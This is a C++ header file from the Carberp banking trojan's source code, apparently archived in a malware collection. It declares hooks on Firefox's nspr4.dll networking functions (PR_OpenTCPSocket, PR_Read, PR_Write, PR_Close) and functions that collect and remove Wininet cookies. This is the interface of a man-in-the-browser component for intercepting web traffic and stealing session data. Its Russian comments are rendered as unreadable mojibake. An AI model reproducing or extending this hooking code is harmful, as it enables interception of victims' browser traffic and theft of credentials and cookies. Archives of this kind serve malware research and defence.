/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  �������� nspr4.dll
*/
#pragma once

#if(BO_NSPR4 > 0)
namespace Nspr4Hook
{
  /*
    �������������.

    IN homePage - �������������� ��������� �������� ��������, ���� NULL ��� [0]=0, �� �� �����������.
  */
  void init(const LPWSTR homePage);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ����� Wininet.
  */
  void _getCookies(void);

  /*
    �������� ����� Wininet.
  */
  void _removeCookies(void);

  /*
    ��������� ������� ������������ �������. ������� ������ ���������� � �������� ���� ���.

    IN module       - ������.
    IN readAddress  - ����� ������������ PR_Read.
    IN writeAddress - ����� ������������ PR_Write.
  */
  void updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void *close, void *readAddress, void *writeAddress);

  /*
    ����������� PR_OpenTCPSocket.
  */
  void *__cdecl hookerPrOpenTcpSocket(int af);
  
  /*
    ����������� PR_Read.
  */
  int __cdecl hookerPrClose(void *fd);

  /*
    ����������� PR_Read.
  */
  __int32 __cdecl hookerPrRead(void *fd, void *buf, __int32 amount);
  
  /*
    ����������� PR_Write.
  */
  __int32 __cdecl hookerPrWrite(void *fd, const void *buf, __int32 amount);
};
#endif
